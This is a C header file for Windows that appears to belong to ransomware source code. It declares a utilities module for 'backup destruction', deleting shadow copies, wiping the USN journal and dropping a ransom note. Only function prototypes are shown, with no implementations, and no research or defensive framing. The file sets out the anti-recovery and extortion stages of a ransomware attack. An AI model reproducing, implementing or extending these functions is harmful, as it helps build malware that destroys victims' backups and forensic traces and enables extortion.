#pragma once
#ifndef UTILS_H
#define UTILS_H
#include <windows.h>
#include <stdbool.h>

/* ============================================================
 * UTILITIES MODULE
 * Backup destruction, privilege escalation, and misc tasks
 * ============================================================ */

/* VSS/Shadow Copy Deletion */
bool UtilsNukeBackups(void);
bool UtilsWipeUSNJournal(void);

/* Ransom Note Delivery */
bool UtilsDropRansomNote(const char *filePath, const char *noteContent);

#endif
